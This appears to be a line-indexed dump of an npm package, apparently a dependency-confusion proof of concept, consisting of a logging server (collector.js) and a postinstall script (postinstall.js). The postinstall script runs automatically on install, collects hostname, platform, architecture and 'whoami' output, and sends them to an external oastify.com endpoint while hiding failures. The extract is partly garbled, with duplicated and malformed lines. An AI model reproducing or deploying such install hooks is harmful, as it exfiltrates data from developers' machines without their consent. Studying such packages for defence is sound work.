// File: var/folders/83/v1gvs5x976xdn94tnyk95j8r0000gq/T/tmp7f24y62j/signup-ui-lego-core/package/collector.js
// ======================================================================
Line 2: const fs = require("fs")
Line 3: const http = require("http")
Line 4: const https = require("https")
Line 5: const dns = require("dns")
Line 6: const express = require("express")
Line 10: express.json({ limit: "32kb" })
Line 12: {
  const xf = (req.headers["x-forwarded-for"] || "").split(",")[0].trim();
  return xf || req.socket.remoteAddress || null;
}
Line 13: const xf = (req.headers["x-forwarded-for"] || "").split(",")[0].trim()
Line 17: app.post("/hubspot-dc-poc", (req, res) => {
  const srcIp = getClientIp(req);
  const entry = {
    received_at: new Date().toISOString(),
    src_ip: srcIp,
    src_headers: {
      "user-agent": req.headers["user-agent"],
      "x-forwarded-for": req.headers["x-forwarded-for"] || null,
      "cf-connecting-ip": req.headers["cf-connecting-ip"] || null
    },
    body: req.body
  };

  // Reverse DNS (best-effort; non-blocking)
  if (srcIp && /^[\d.]+$/.test(srcIp)) {
    dns.reverse(srcIp, (err, hostnames) => {
      entry.src_rdns = err ? null : hostnames;
      fs.appendFileSync("events.ndjson", JSON.stringify(entry) + "\n");
    });
  } else {
    fs.appendFileSync("events.ndjson", JSON.stringify(entry) + "\n");
  }

  res.status(204).end();
})
Line 19: const entry = {
    received_at: new Date().toISOString(),
    src_ip: srcIp,
    src_headers: {
      "user-agent": req.headers["user-agent"],
      "x-forwarded-for": req.headers["x-forwarded-for"] || null,
      "cf-connecting-ip": req.headers["cf-connecting-ip"] || null
    },
    body: req.body
  }
Line 22: _tmp_3.src_headers = {
      "user-agent": req.headers["user-agent"],
      "x-forwarded-for": req.headers["x-forwarded-for"] || null,
      "cf-connecting-ip": req.headers["cf-connecting-ip"] || null
    }
Line 23: _tmp_6.user-agent = req.headers["user-agent"]
Line 24: _tmp_6.x-forwarded-for = req.headers["x-forwarded-for"] || null
Line 25: _tmp_6.cf-connecting-ip = req.headers["cf-connecting-ip"] || null
Line 31: /^[\d.]+$/.test(srcIp)
Line 40: res.status(204).end()

// File: var/folders/83/v1gvs5x976xdn94tnyk95j8r0000gq/T/tmp7f24y62j/signup-ui-lego-core/package/postinstall.js
// ======================================================================
Line 7: const os = require("os")
Line 8: _tmp_4 = require("child_process")
Line 9: const https = require("https")
Line 10: const crypto = require("crypto")
Line 13: const COLLECTOR_URL = "https://28891s3g8641q4f4mx6srmgb228twjk8.oastify.com"
Line 16: (process.env.npm_config_user_agent || "npm").includes("yarn")
Line 23: os.hostname()
Line 24: os.platform()
Line 26: os.arch()
Line 32: {
  const url = new URL(COLLECTOR_URL);
  const body = Buffer.from(JSON.stringify(data), "utf8");

  const req = https.request(
    {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname + url.search,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": body.length,
        // Identify this clearly as a benign PoC:
        "User-Agent": "dependency-confusion-poc/1.0"
      },
      timeout: 2000 // 2s end-to-end
    },
    (res) => {
      // Consume response quietly and exit
      res.on("data", () => {});
      res.on("end", () => process.exit(0));
    }
  );

  req.on("timeout", () => {
    req.destroy(new Error("timeout"));
  });

  req.on("error", (err) => {
    if (attempt < 2) {
      // One light retry
      setTimeout(() => send(data, attempt + 1), 200);
    } else {
      // Never fail the install: exit successfully
      process.exit(0);
    }
  });

  req.write(body);
  req.end();
}
Line 34: Buffer.from(JSON.stringify(data), "utf8")
Line 36: const req = https.request(
    {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname + url.search,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": body.length,
        // Identify this clearly as a benign PoC:
        "User-Agent": "dependency-confusion-poc/1.0"
      },
      timeout: 2000 // 2s end-to-end
    },
    (res) => {
      // Consume response quietly and exit
      res.on("data", () => {});
      res.on("end", () => process.exit(0));
    }
  )
Line 53: process.exit(0)
Line 57: {
    req.destroy(new Error("timeout"));
  }
Line 58: req.destroy(new Error("timeout"))
Line 62: {
      // One light retry
      setTimeout(() => send(data, attempt + 1), 200);
    }
Line 64: setTimeout(() => send(data, attempt + 1), 200)
Line 67: process.exit(0)
Line 71: req.write(body)
Line 72: req.end()
Line 76: exec(process.platform === "win32" ? "whoami.exe" : "whoami", { timeout: 1500 }, (err, stdout) => {
  const whoami = (stdout || "").toString().trim() || null;

  const payload = {
    ...payloadBase,
    whoami
  };

  send(payload);
})
Line 77: (stdout || "").toString().trim()
Line 84: send(payload)
